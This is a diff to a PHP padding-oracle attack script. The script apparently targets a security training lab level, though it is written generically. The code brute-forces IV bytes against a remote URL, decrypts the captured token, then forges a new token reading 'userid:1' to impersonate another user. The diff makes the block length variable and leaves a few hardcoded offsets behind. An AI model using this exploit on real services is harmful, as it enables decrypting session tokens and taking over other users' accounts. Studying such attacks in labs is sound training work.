@@ -91,19 +91,26 @@ function do_attack ($iv_string_b64, $token, $url) {
 
 	$init_iv = array_values ($temp_init_iv);
 
+	# The block-oriented padding-oracle walk below assumes a classic
+	# CBC IV/block size. It is derived from the actual IV length so the
+	# script degrades gracefully (rather than crashing) when pointed at
+	# a scheme that no longer uses a 16-byte CBC IV, such as the AEAD
+	# nonce this level now uses - which has no padding to find at all.
+	$block_len = count ($init_iv);
+
 	print "Trying to decrypt\n";
 	print "\n";
 
-	$iv = zero_array(16);
-	$zeroing = zero_array(16);
+	$iv = zero_array($block_len);
+	$zeroing = zero_array($block_len);
 
 
-	for ($padding = 1; $padding <= 16; $padding++) {
-		$offset = 16 - $padding;
+	for ($padding = 1; $padding <= $block_len; $padding++) {
+		$offset = $block_len - $padding;
 		print ("Looking at offset $offset for padding $padding\n");
 		for ($i = 0; $i <= 0xff; $i++) {
 			$iv[$offset] = $i;
-			for ($k = $offset + 1; $k < 16; $k++) {
+			for ($k = $offset + 1; $k < $block_len; $k++) {
 				$iv[$k] = $zeroing[$k] ^ $padding;
 			}
 			try {
@@ -152,7 +159,7 @@ function do_attack ($iv_string_b64, $token, $url) {
 					// Used by the edge case check
 
 					$ignore = false;
-					if ($offset == 15) {
+					if ($offset == $block_len - 1) {
 						print "Got a valid decrypt for offset 15, checking edge case\n";
 						$temp_iv = $iv;
 						$temp_iv[14] = 0xff;
@@ -196,8 +203,9 @@ function do_attack ($iv_string_b64, $token, $url) {
 
 	$x = xor_byte_array ($init_iv, $zeroing);
 	print "Decrypted string with padding: " . byte_array_to_string ($x) . "\n";
-	$number_of_padding_bytes = $x[15];
-	$without_padding = array_slice ($x, 0, 16 - $number_of_padding_bytes);
+	$number_of_padding_bytes = $x[$block_len - 1];
+	$pad_len = max (0, min ($block_len, $number_of_padding_bytes));
+	$without_padding = array_slice ($x, 0, $block_len - $pad_len);
 	print "Decrypted string without padding: " . byte_array_to_string ($without_padding) . "\n";
 
 	$str = '';
@@ -223,12 +231,12 @@ function do_attack ($iv_string_b64, $token, $url) {
 	$new_clear = "userid:1";
 	print "New clear text: " . $new_clear . "\n";
 
-	for ($i = 0; $i < strlen($new_clear); $i++) {
+	for ($i = 0; $i < strlen($new_clear) && $i < $block_len; $i++) {
 		$zeroing[$i] = $zeroing[$i] ^ ord($new_clear[$i]);
 	}
-	$padding = 16 - strlen($new_clear);
-	$offset = 16 - $padding;
-	for ($i = $offset; $i < 16; $i++) {
+	$padding = max (0, $block_len - strlen($new_clear));
+	$offset = $block_len - $padding;
+	for ($i = $offset; $i < $block_len; $i++) {
 		$zeroing[$i] = $zeroing[$i] ^ $padding;
 	}
 
